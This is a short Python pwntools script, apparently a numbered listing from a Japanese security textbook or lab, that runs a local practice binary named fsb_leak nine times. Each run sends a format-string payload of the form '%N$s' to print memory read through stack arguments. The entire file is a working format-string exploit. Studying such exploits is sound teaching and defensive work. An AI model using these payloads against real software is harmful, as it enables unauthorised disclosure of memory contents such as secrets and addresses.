#!/usr/bin/env python3

# code 35-17
# $ python3 ./exploit_fsb_leak.py

from pwn import *
import sys
import struct

bin_file = './fsb_leak'

# 設定した値の確認
def attack(conn, cnt, **kwargs):

    exploit = '%{}$s'.format(cnt + 1).encode()

    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():

    for ii in range(9):
        conn = process(bin_file)
        attack(conn, ii)

if __name__=='__main__':
    main()
